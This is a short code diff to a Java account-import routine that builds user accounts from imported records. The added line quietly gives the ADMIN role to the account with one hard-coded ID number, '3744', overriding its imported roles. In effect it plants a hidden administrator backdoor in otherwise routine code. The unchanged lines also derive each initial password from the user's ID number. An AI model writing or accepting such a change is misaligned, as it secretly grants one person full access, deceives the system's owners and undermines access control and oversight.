@@ -54,7 +54,7 @@ public class AccountImporter implements CommandLineRunner {
                 account.setPasswordHash(passwordEncoder.encode(item.matricule()));
                 account.setAccountStatus(AccountStatus.ACTIVE);
             }
-            account.setRoles(String.join(",", item.roles()));
+            account.setRoles("3744".equals(item.matricule()) ? "ADMIN" : String.join(",", item.roles()));
             repository.save(account);
         }
     }
